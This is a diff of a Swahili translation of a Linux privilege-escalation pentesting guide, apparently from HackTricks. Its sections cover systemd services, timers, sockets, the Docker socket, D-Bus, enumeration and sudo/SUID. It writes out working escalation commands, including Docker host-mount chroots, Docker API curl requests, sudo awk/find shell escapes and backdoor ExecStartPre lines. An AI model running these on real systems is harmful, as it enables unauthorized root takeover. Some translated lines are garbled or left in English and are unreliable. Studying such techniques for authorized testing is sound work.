+Inawezekana kuunda kazi ya cron **ikiweka kurudi kwa gari baada ya maoni** (bila tabia ya newline), na kazi ya cron itafanya kazi. Mfano (angalia tabia ya kurudi kwa gari):
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
-## Huduma
+## Services
 
-### Faili za _.service_ Zinazoweza Kuandikwa
+### Writable _.service_ files
 
-Angalia ikiwa unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** mlango wako wa nyuma wakati huduma inapoanza, inapoanzishwa upya au inaposimamishwa (labda utahitaji kusubiri hadi mashine ibadilishwe).\
-Kwa mfano, unda mlango wako wa nyuma ndani ya faili ya .service na **`ExecStart=/tmp/script.sh`**
+Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kurekebisha** ili **itekeleze** backdoor yako wakati huduma inapo **anzishwa**, **kurejeshwa** au **kusitishwa** (labda utahitaji kusubiri hadi mashine ireboot).\
+Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service na **`ExecStart=/tmp/script.sh`**
 
-### Binaries za Huduma Zinazoweza Kuandikwa
+### Writable service binaries
 
-Kumbuka kwamba ikiwa una **ruhusa ya kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha kwa milango ya nyuma ili wakati huduma zinapotekelezwa tena milango ya nyuma itatekelezwa.
+Kumbuka kwamba ikiwa una **idhini za kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha kwa backdoors ili wakati huduma hizo zitakapotekelezwa tena backdoors zitatekelezwa.
 
-### PATH ya systemd - Njia za Kihesabu
+### systemd PATH - Relative Paths
 
-Unaweza kuona PATH inayotumiwa na **systemd** kwa:
+Unaweza kuona PATH inayotumika na **systemd** kwa:
 ```bash
 systemctl show-environment
 ```
-Ikiwa utagundua kwamba unaweza **kuandika** katika folda yoyote kwenye njia, huenda ukaweza **kuinua mamlaka**. Unahitaji kutafuta **njia za kihusika zinazotumiwa kwenye faili za mipangilio ya huduma** kama:
+Ikiwa unapata kwamba unaweza **kuandika** katika yoyote ya folda za njia hiyo unaweza kuwa na uwezo wa **kuinua mamlaka**. Unahitaji kutafuta **njia za uhusiano zinazotumika kwenye faili za usanidi wa huduma** kama:
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Kisha, tengeneza **faili inayoweza kutekelezwa** yenye **jina sawa na njia ya kihierarkia ya binary** ndani ya folda ya PATH ya systemd unayoweza kuandika, na wakati huduma inapoombwa kutekeleza hatua ya udhaifu (**Anza**, **Acha**, **Pakia tena**), **backdoor yako itatekelezwa** (watumiaji wasio na ruhusa kawaida hawawezi kuanza/kuacha huduma lakini angalia kama unaweza kutumia `sudo -l`).
+Kisha, tengeneza **executable** yenye **jina sawa na njia ya binary** ndani ya folda ya systemd PATH ambayo unaweza kuandika, na wakati huduma inapoombwa kutekeleza kitendo kilichohatarishwa (**Start**, **Stop**, **Reload**), **backdoor yako itatekelezwa** (watumiaji wasio na haki mara nyingi hawawezi kuanzisha/kusitisha huduma lakini angalia kama unaweza kutumia `sudo -l`).
 
 **Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**
 
-## **Majira**
+## **Timers**
 
-**Majira** ni faili za kitengo za systemd ambazo jina lake linamalizika kwa `**.timer**` ambazo huendesha faili au matukio ya `**.service**`. **Majira** yanaweza kutumika kama mbadala wa cron kwani wana msaada wa kujengwa kwa matukio ya wakati wa kalenda na matukio ya wakati wa monotonic na wanaweza kukimbia kwa njia isiyo ya moja kwa moja.
+**Timers** ni faili za kitengo cha systemd ambazo jina lake linamalizika na `**.timer**` ambazo zinadhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada wa ndani kwa matukio ya wakati wa kalenda na matukio ya wakati wa monotonic na zinaweza kuendeshwa kwa njia isiyo ya sambamba.
 
-Unaweza kuchambua majira yote kwa:
+Unaweza kuorodhesha timers zote kwa:
 ```bash
 systemctl list-timers --all
 ```
-### Timers zinazoweza kuandikwa
+### Writable timers
 
-Ikiwa unaweza kuhariri timer unaweza kufanya iendelee kutekeleza baadhi ya vitu vilivyopo katika systemd.unit (kama vile `.service` au `.target`)
+Ikiwa unaweza kubadilisha timer unaweza kufanya iweze kutekeleza baadhi ya matukio ya systemd.unit (kama `.service` au `.target`)
 ```bash
 Unit=backdoor.service
 ```
-Katika hati ya maelezo unaweza kusoma ni nini Kitengo:
+Katika hati unaweza kusoma ni nini Unit:
 
-> Kitengo cha kuamsha wakati huu wa kengele unapopita. Hoja ni jina la kitengo, ambalo sio ".timer". Ikiwa haielezwi, thamani hii inabadilika kiotomatiki kuwa huduma ambayo ina jina sawa na kitengo cha timer, isipokuwa kwa kufikia mwisho. (Tazama hapo juu.) Inapendekezwa kwamba jina la kitengo kinachoamilishwa na jina la kitengo cha timer viitwe kwa jina moja, isipokuwa kwa kufikia mwisho.
+> Kitengo cha kuamsha wakati kipima muda hiki kinapokamilika. Hoja ni jina la kitengo, ambacho kiambishi chake si ".timer". Ikiwa hakijasemwa, thamani hii inarudi kwa huduma ambayo ina jina sawa na kitengo cha kipima muda, isipokuwa kwa kiambishi. (Tazama hapo juu.) Inapendekezwa kwamba jina la kitengo kinachowashwa na jina la kitengo cha kipima muda ni sawa, isipokuwa kwa kiambishi.
 
 Kwa hivyo, ili kutumia ruhusa hii unahitaji:
 
-* Kupata kitengo cha systemd (kama `.service`) ambacho kina **utekelezaji wa faili inayoweza kuandikwa**
-* Kupata kitengo cha systemd ambacho kina **utekelezaji wa njia ya kihesabu** na una **ruhusa za kuandika** kwenye **NJIA ya systemd** (kujifanya kuwa utekelezaji huo)
+* Kupata kitengo fulani cha systemd (kama `.service`) ambacho kina **tekeleza binary inayoweza kuandikwa**
+* Kupata kitengo fulani cha systemd ambacho kina **tekeleza njia ya uhusiano** na una **ruhusa za kuandika** juu ya **PATH ya systemd** (ili kujifanya kuwa executable hiyo)
 
-**Jifunze zaidi kuhusu muda na `man systemd.timer`.**
+**Jifunze zaidi kuhusu vipima muda na `man systemd.timer`.**
 
-### **Kuwezesha Timer**
+### **Kuwezesha Kipima Muda**
 
-Ili kuwezesha timer unahitaji ruhusa ya mzizi na kutekeleza:
+Ili kuwezesha kipima muda unahitaji ruhusa za mzizi na kutekeleza:
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Tafadhali kumbuka **timer** ina **anzishwa** kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
-Unix Domain Sockets (UDS) huwezesha **mawasiliano ya mchakato** kwenye mashine sawa au tofauti ndani ya mifano ya mteja-seva. Hutumia faili za maelezo za Unix za kawaida kwa mawasiliano kati ya kompyuta na huanzishwa kupitia faili za `.socket`.
+Unix Domain Sockets (UDS) enable **mwasiliano wa mchakato** kwenye mashine sawa au tofauti ndani ya mifano ya mteja-server. Wanatumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na zimewekwa kupitia faili za `.socket`.
 
-Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.
+Sockets zinaweza kuundwa kwa kutumia faili za `.socket`.
 
-**Jifunze zaidi kuhusu sockets na `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:
+**Jifunze zaidi kuhusu sockets na `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kuundwa:
 
-* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti lakini muhtasari hutumiwa kuonyesha **mahali itakaposikiliza** soketi (njia ya faili ya soketi ya AF\_UNIX, anwani ya IPv4/6 na/au nambari ya bandari ya kusikiliza, n.k.)
-* `Accept`: Inachukua hoja ya boolean. Ikiwa **kweli**, kipengele cha **huduma kinazalishwa kwa kila uunganisho unaoingia** na soketi ya uunganisho pekee inapitishwa kwake. Ikiwa **uwongo**, soketi zote zinazosikiliza zenyewe zinapitishwa kwa kipengele cha huduma kilichoanzishwa, na kipengele kimoja cha huduma kinazalishwa kwa uunganisho wote. Thamani hii inapuuzwa kwa soketi za datagram na FIFO ambapo kipengele kimoja cha huduma kinalinganisha kwa hali yoyote trafiki yote inayoingia. **Ina thamani ya uwongo**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
-* `ExecStartPre`, `ExecStartPost`: Inachukua mistari moja au zaidi ya amri, ambayo inatekelezwa **kabla** au **baada** ya soketi za kusikiliza/FIFOs kuundwa na kufungwa, mtawalia. Token ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, kisha ikifuatiwa na hoja za mchakato.
-* `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zinatekelezwa **kabla** au **baada** ya soketi za kusikiliza/FIFOs kufungwa na kuondolewa, mtawalia.
-* `Service`: Inabainisha jina la kipengele cha **huduma cha kuamilisha** kwenye **trafiki inayoingia**. Mipangilio hii inaruhusiwa tu kwa soketi zenye Accept=no. Kwa kawaida inarudi kwa huduma inayobeba jina sawa na soketi (na kiambishi kilichobadilishwa). Katika hali nyingi, haipaswi kuwa lazima kutumia chaguo hili.
+* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari unatumiwa ku **onyesha wapi itasikiliza** socket (njia ya faili la socket la AF_UNIX, IPv4/6 na/nambari ya bandari ya kusikiliza, nk.)
+* `Accept`: Inachukua hoja ya boolean. Ikiwa **kweli**, **kigezo cha huduma kinazaliwa kwa kila muunganisho unaokuja** na socket ya muunganisho pekee inapitishwa kwake. Ikiwa **uongo**, sockets zote zinazolisikiliza zenyewe zinapitishwa kwa **kitengo cha huduma kilichozinduliwa**, na kitengo kimoja cha huduma kinazaliwa kwa muunganisho wote. Thamani hii inapuuziliwa mbali kwa sockets za datagram na FIFOs ambapo kitengo kimoja cha huduma kinashughulikia bila masharti trafiki yote inayokuja. **Inarudiwa kuwa uongo**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
+* `ExecStartPre`, `ExecStartPost`: Inachukua mistari moja au zaidi ya amri, ambazo zina **tekelezwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikiliza ku **undwa** na kuunganishwa, mtawalia. Neno la kwanza la mstari wa amri lazima liwe jina la faili la moja kwa moja, kisha kufuatwa na hoja za mchakato.
+* `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zina **tekelezwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikiliza ku **fungwa** na kuondolewa, mtawalia.
+* `Service`: Inaelezea jina la **kitengo cha huduma** **kuanzisha** kwenye **trafiki inayokuja**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Inarudi kwa huduma inayobeba jina sawa na socket (ikiwa na kiambishi kilichobadilishwa). Katika hali nyingi, haitakuwa lazima kutumia chaguo hili.
 
-### Faili za .socket zenye uwezo wa kuandikwa
+### Writable .socket files
 
-Ikiwa unapata faili ya `.socket` inayoweza **kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na mlango wa nyuma utatekelezwa kabla ya soketi kuundwa. Kwa hivyo, **labda utahitaji kusubiri hadi mashine ibadilishwe.**\
-_Tafadhali kumbuka kuwa mfumo lazima utumie usanidi wa faili ya soketi au mlango wa nyuma hautatekelezwa_
+Ikiwa unapata faili ya `.socket` inayoweza kuandikwa unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla ya socket kuundwa. Hivyo, **labda utahitaji kusubiri hadi mashine ireboot.**\
+&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_
 
-### Sockets zenye uwezo wa kuandikwa
+### Writable sockets
 
-Ikiwa **unatambua soketi inayoweza kuandikwa** (_sasa tunazungumzia juu ya Sockets za Unix na sio kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na soketi hiyo na labda kutumia udhaifu.
+Ikiwa **unatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia kuhusu Unix Sockets na si kuhusu faili za config `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.
 
-### Panga Sockets za Unix
+### Enumerate Unix Sockets
 ```bash
 netstat -a -p --unix
 ```
-### Uunganisho ghafi
+### Muunganisho wa moja kwa moja
 ```bash
 #apt-get install netcat-openbsd
 nc -U /tmp/socket  #Connect to UNIX-domain stream socket
@@ -500,7 +493,7 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 #apt-get install socat
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
-**Mfano wa Utekaji:**
+**Mfano wa unyakuzi:**
 
 {% content-ref url="socket-command-injection.md" %}
 [socket-command-injection.md](socket-command-injection.md)
@@ -508,44 +501,46 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 ### Soketi za HTTP
 
-Tafadhali elewa kwamba kunaweza kuwa na **soketi zinazosikiliza maombi ya HTTP** (_Sinaongelei faili za .socket bali faili zinazofanya kazi kama soketi za unix_). Unaweza kuchunguza hili kwa kutumia:
+Kumbuka kwamba kunaweza kuwa na **soketi zinazotafakari maombi ya HTTP** (_Sizungumzii kuhusu faili za .socket bali faili zinazofanya kazi kama soketi za unix_). Unaweza kuangalia hii kwa:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
-### Socket ya Writable ya Docker
+Ikiwa socket **inas respond na HTTP** ombi, basi unaweza **kuwasiliana** nayo na labda **kutumia udhaifu fulani**.
 
-Socket ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kikundi cha `docker`. Kuwa na ufikiaji wa kuandika kwa socket hii kunaweza kusababisha ongezeko la mamlaka. Hapa kuna maelezo ya jinsi hii inaweza kufanywa na njia mbadala ikiwa CLI ya Docker haipatikani.
+### Socket ya Docker Inayoweza Kuandikwa
 
-#### **Ongezeko la Mamlaka na Docker CLI**
+Socket ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa kawaida, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na ufikiaji wa kuandika kwenye socket hii kunaweza kusababisha kupanda hadhi. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.
 
-Ikiwa una ufikiaji wa kuandika kwa socket ya Docker, unaweza kuongeza mamlaka kwa kutumia amri zifuatazo:
+#### **Kupanda Hadhi kwa kutumia Docker CLI**
+
+Ikiwa una ufikiaji wa kuandika kwenye socket ya Docker, unaweza kupanda hadhi kwa kutumia amri zifuatazo:
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-Hizi amri zinaruhusu kukimbia kontena na ufikiaji wa kiwango cha mizizi kwa mfumo wa faili wa mwenyeji.
+These commands allow you to run a container with root-level access to the host's file system.
 
-#### **Kutumia Docker API Moja kwa Moja**
+#### **Using Docker API Directly**
 
-Katika hali ambapo Docker CLI haipatikani, soketi ya Docker inaweza bado kuhaririwa kwa kutumia API ya Docker na amri za `curl`.
+In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.
 
-1.  **Orodhesha Picha za Docker:** Pata orodha ya picha zilizopo.
+1.  **List Docker Images:** Retrieve the list of available images.
 
 ```bash
 curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
-2.  **Unda Kontena:** Tuma ombi la kuunda kontena ambayo inamnasa saraka kuu ya mfumo wa mwenyeji.
+2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.
 
 ```bash
 curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
 ```
 
-Anza kontena ulilounda:
+Start the newly created container:
 
 ```bash
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
 ```
-3.  **Ambatisha kwa Kontena:** Tumia `socat` kuweka uhusiano na kontena, kuruhusu utekelezaji wa amri ndani yake.
+3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.
 
 ```bash
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -555,29 +550,29 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-Baada ya kuweka uhusiano wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya kontena na ufikiaji wa kiwango cha mizizi kwa mfumo wa faili wa mwenyeji.
+After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.
 
-### Mambo Mengine
+### Others
 
-Tafadhali kumbuka kwamba ikiwa una ruhusa za kuandika juu ya soketi ya docker kwa sababu uko **ndani ya kikundi cha `docker`** una [**njia zaidi za kuongeza viwango vya ruhusa**](makundi-ya-kuvutia-linux-pe/#kikundi-cha-docker). Ikiwa [**API ya docker inasikiliza kwenye bandari** unaweza pia kuweza kuishambulia](../../uchunguzi-wa-pentesting-wa-huduma-za-mtandao/2375-uchunguzi-wa-pentesting-docker.md#kuishambulia).
+Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Angalia **njia zaidi za kuvunja kutoka kwa docker au kuitumia kuongeza viwango vya ruhusa** katika:
+Check **more ways to break out from docker or abuse it to escalate privileges** in:
 
-{% content-ref url="usalama-wa-docker/" %}
-[usalama-wa-docker](usalama-wa-docker/)
+{% content-ref url="docker-security/" %}
+[docker-security](docker-security/)
 {% endcontent-ref %}
 
-## Kupandisha Viwango vya Ruhusa kwa Containerd (ctr)
+## Containerd (ctr) privilege escalation
 
-Ikiwa unagundua kwamba unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwani **unaweza kuitumia kwa kufanya viwango vya ruhusa**:
+If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
 {% content-ref url="containerd-ctr-privilege-escalation.md" %}
 [containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
 {% endcontent-ref %}
 
-## Kupandisha Viwango vya Ruhusa kwa **RunC**
+## **RunC** privilege escalation
 
-Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **unaweza kuitumia kwa kufanya viwango vya ruhusa**:
+If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
 {% content-ref url="runc-privilege-escalation.md" %}
 [runc-privilege-escalation.md](runc-privilege-escalation.md)
@@ -585,15 +580,15 @@ Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao k
 
 ## **D-Bus**
 
-D-Bus ni **mfumo wa Mawasiliano kati ya Michakato (IPC)** wa kisasa unaowezesha programu kuingiliana na kushiriki data kwa ufanisi. Iliyoundwa kwa kuzingatia mfumo wa Linux wa kisasa, inatoa mfumo imara kwa aina tofauti za mawasiliano ya programu.
+D-Bus ni mfumo wa **mawasiliano kati ya michakato (IPC)** ambao unaruhusu programu kuingiliana na kushiriki data kwa ufanisi. Imeundwa kwa kuzingatia mfumo wa kisasa wa Linux, inatoa mfumo thabiti wa mawasiliano ya aina mbalimbali za programu.
 
-Mfumo huu ni mpana, ukisaidia IPC ya msingi inayoboresha kubadilishana data kati ya michakato, ikikumbusha **soketi za eneo la UNIX zilizoboreshwa**. Zaidi ya hayo, inasaidia kutangaza matukio au ishara, ikisaidia ushirikiano laini kati ya sehemu za mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu ya kuingia inaweza kusababisha mpiga muziki kuzima, ikiboresha uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa vitu vya mbali, ikisimplifisha maombi ya huduma na mwaliko wa njia kati ya programu, ikipunguza mchakato ambao kihistoria ulikuwa mgumu.
+Mfumo huu ni wa kubadilika, ukisaidia IPC ya msingi inayoboresha ubadilishanaji wa data kati ya michakato, ikikumbusha **sockets za UNIX zilizoboreshwa**. Aidha, inasaidia kutangaza matukio au ishara, ikichochea uunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kumfanya mpiga muziki akate sauti, kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inasaidia mfumo wa vitu vya mbali, ikirahisisha maombi ya huduma na wito wa mbinu kati ya programu, ikipunguza michakato ambayo hapo awali ilikuwa ngumu.
 
-D-Bus inafanya kazi kwa **mfano wa kuruhusu/kukataa**, ikisimamia ruhusa za ujumbe (wito wa njia, kutuma ishara, n.k.) kulingana na athari jumla ya sheria za sera zinazolingana. Sera hizi hufafanua mwingiliano na basi, ikiruhusu kwa uwezekano wa kupandisha viwango vya ruhusa kupitia unyanyasaji wa ruhusa hizi.
+D-Bus inafanya kazi kwa **mfumo wa ruhusa/kuzuia**, ikisimamia ruhusa za ujumbe (wito wa mbinu, utoaji wa ishara, n.k.) kulingana na athari ya jumla ya sheria za sera zinazolingana. Sera hizi zinaelezea mwingiliano na basi, na inaweza kuruhusu kupandisha mamlaka kupitia matumizi mabaya ya ruhusa hizi.
 
-Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` unatolewa, ukielezea ruhusa kwa mtumiaji wa mizizi kumiliki, kutuma kwa, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.
+Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` unapatikana, ukielezea ruhusa za mtumiaji wa root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.
 
-Sera bila mtumiaji au kikundi kilichotajwa inatumika kwa kila mtu, wakati sera za muktadha "default" zinatumika kwa wote wasiofunikwa na sera maalum zingine.
+Sera bila mtumiaji au kundi lililobainishwa zinatumika kwa ujumla, wakati sera za muktadha "default" zinatumika kwa wote ambao hawajafunikwa na sera nyingine maalum.
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -610,9 +605,9 @@ Sera bila mtumiaji au kikundi kilichotajwa inatumika kwa kila mtu, wakati sera z
 
 ## **Mtandao**
 
-Ni ya kuvutia sana kuhesabu mtandao na kugundua nafasi ya mashine.
+Daima ni ya kuvutia kuhesabu mtandao na kubaini nafasi ya mashine.
 
-### Uhesabuaji wa kawaida
+### Hesabu ya jumla
 ```bash
 #Hostname, hosts and DNS
 cat /etc/hostname /etc/hosts /etc/resolv.conf
@@ -635,24 +630,24 @@ cat /etc/networks
 #Files used by network services
 lsof -i
 ```
-### Vioja vya wazi
+### Open ports
 
-Daima angalia huduma za mtandao zinazoendesha kwenye mashine ambayo haukuweza kuingiliana nayo kabla ya kufikia:
+Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambayo hukuweza kuingiliana nayo kabla ya kuifikia:
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
 ```
-### Kuchunguza
+### Sniffing
 
-Angalia kama unaweza kuchunguza trafiki. Ikiwa unaweza, unaweza kupata baadhi ya siri za kuingia.
+Angalia kama unaweza kunusa trafiki. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata baadhi ya akidi.
 ```
 timeout 1 tcpdump
 ```
-## Watumiaji
+## Users
 
-### Uchambuzi wa Kawaida
+### Generic Enumeration
 
-Angalia **wewe ni nani**, una **mamlaka** gani, ni **watumiaji** gani wako kwenye mifumo, ni yupi anaweza **kuingia** na yupi ana **mamlaka ya root:**
+Angalia **nani** ulivyo, ni **privileges** gani unazo, ni **users** gani wako kwenye mifumo, ni zipi zinaweza **login** na zipi zina **root privileges:**
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -674,22 +669,22 @@ for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | so
 #Current user PGP keys
 gpg --list-keys 2>/dev/null
 ```
-### UID Kubwa
+### Big UID
 
-Baadhi ya toleo za Linux ziliathiriwa na mdudu ambao huruhusu watumiaji wenye **UID > INT\_MAX** kuongeza mamlaka. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
+Baadhi ya toleo za Linux zilikuwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT\_MAX** kupandisha mamlaka. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
 **Tumia** kwa: **`systemd-run -t /bin/bash`**
 
-### Vikundi
+### Groups
 
-Angalia kama wewe ni **mwanachama wa kikundi fulani** kinachoweza kukupatia mamlaka ya mzizi:
+Angalia kama wewe ni **mwanachama wa kundi lolote** ambalo linaweza kukupa mamlaka ya root:
 
 {% content-ref url="interesting-groups-linux-pe/" %}
 [interesting-groups-linux-pe](interesting-groups-linux-pe/)
 {% endcontent-ref %}
 
-### Ubao wa Kuchorea
+### Clipboard
 
-Angalia kama kuna kitu cha kuvutia kilichopo ndani ya ubao wa kuchorea (ikiwezekana)
+Angalia kama kuna kitu chochote cha kuvutia kilichopo ndani ya clipboard (ikiwa inawezekana)
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
 echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
@@ -704,29 +699,29 @@ fi
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
-### Nywila Zinazojulikana
+### Known passwords
 
-Ikiwa **unajua nywila yoyote** ya mazingira **jaribu kuingia kama kila mtumiaji** kwa kutumia nywila hiyo.
+Ikiwa unajua **nenosiri lolote** la mazingira **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.
 
 ### Su Brute
 
-Ikiwa hujali kufanya kelele nyingi na programu za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kuvunja nguvu mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) pamoja na kiparameta `-a` pia jaribu kuvunja nguvu watumiaji.
+Ikiwa hujali kufanya kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu kuingilia mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa kutumia parameter `-a` pia hujaribu kuingilia watumiaji.
 
-## Mabaya ya PATH yanayoweza Kuandikwa
+## Writable PATH abuses
 
 ### $PATH
 
-Ikiwa unagundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuinua mamlaka kwa **kuunda mlango wa nyuma ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (kimsingi root) na ambayo **haipakuliwi kutoka kwenye folda iliyopo kabla** ya folda yako inayoweza kuandikwa kwenye $PATH.
+Ikiwa unapata kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa kupandisha mamlaka kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (root kwa njia bora) na ambayo **haitapakiwa kutoka folda ambayo iko kabla** ya folda yako inayoweza kuandikwa katika $PATH.
 
-### SUDO na SUID
+### SUDO and SUID
 
-Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au wanaweza kuwa na biti ya suid. Angalia kwa kutumia:
+Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na bit ya suid. Angalia kwa kutumia:
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
-Baadhi ya **amri zisizotarajiwa kuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
+Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find /etc -exec sh -i \;
